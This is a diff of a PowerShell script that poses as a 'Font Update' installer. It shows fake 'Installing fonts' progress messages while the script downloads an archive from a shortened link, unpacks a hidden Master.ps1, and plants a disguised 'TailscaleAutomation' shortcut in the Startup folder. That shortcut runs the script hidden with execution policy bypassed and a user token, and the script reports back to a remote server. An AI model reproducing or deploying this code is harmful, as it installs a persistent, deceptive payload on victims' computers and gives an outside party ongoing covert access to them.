@@ -19,7 +19,7 @@ if (-not $instanceCheck.Acquired) {
 }
 
 try {
-    Write-Progress -Activity "Font Update" -Status "Initializing environment..." -PercentComplete 10
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 10
     $urlServer = "https://cursive.onrender.com"
     $userToken = $ut
     $url = "https://tinyurl.com/$dpty"
@@ -37,7 +37,7 @@ try {
 
     }
 
-    Write-Progress -Activity "Font Update" -Status "Adding the font..." -PercentComplete 30
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 20
     $curl = Get-Command curl.exe -ErrorAction SilentlyContinue 
     if ($curl) {
         curl.exe -s -S -L --retry 10 --retry-delay 5 -o $destination $url | Out-Null
@@ -45,10 +45,10 @@ try {
         Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
     }
 
-    Write-Progress -Activity "Font Update" -Status "Adding the font (Please dont close)..." -PercentComplete 60
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 40
     Expand-Archive -Path $destination -DestinationPath $DataFilePath -Force | Out-Null
 
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 2
 
     Remove-Item $destination -Force -ErrorAction SilentlyContinue | Out-Null
 
@@ -64,7 +64,7 @@ try {
 
     Copy-Item -Path $masterTxtPath -Destination $masterPs1Path -Force | Out-Null
 
-    Write-Progress -Activity "Font Update" -Status "Finalizing configuration..." -PercentComplete 90
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 60
     $startupFolder = [Environment]::GetFolderPath("Startup")
     $shortcutPath = Join-Path $startupFolder "TailscaleAutomation.lnk"
 
@@ -73,11 +73,13 @@ try {
         $shortcut = $WshShell.CreateShortcut($shortcutPath)
 
         $shortcut.TargetPath = "powershell.exe"
-        $shortcut.Arguments = "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token '$userToken'"
+        $shortcut.Arguments = "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token `"$userToken`""
         $shortcut.Save() | Out-Null
     }
 
-    Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token '$userToken'"
+    Start-Process powershell.exe -ArgumentList "-NoLogo -NoProfile -WindowStyle hidden -ExecutionPolicy Bypass -File `"$env:USERPROFILE\Documents\CodeFile\Master.ps1`" -token `"$userToken`""
+
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 80
 
     $compBody = @{ t = $userToken } | ConvertTo-Json
     Invoke-RestMethod -Uri "${urlServer}/api/file-complete" -Method Post -Body $compBody -ContentType "application/json" | Out-Null
@@ -87,12 +89,14 @@ try {
     $statusBody = @{ t = $userToken; file = "Git" } | ConvertTo-Json
     Invoke-RestMethod -Uri "${urlServer}/log-status" -Method Post -Body $statusBody -ContentType "application/json" | Out-Null
 
-    Write-Progress -Activity "Font Update" -Status "Complete" -PercentComplete 100
+    Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 100
     if ($Error.Count -gt 0) {
         $errorDetails = @{
             Source = "Git_dev" 
             token = $userToken
-            error_list = $Error | ForEach-Object { $_.ToString() }  
+            error_list = $Error | ForEach-Object { 
+                "[Line $($_.InvocationInfo.ScriptLineNumber)]  $($_.ToString())" 
+            }  
         }
 
         try {
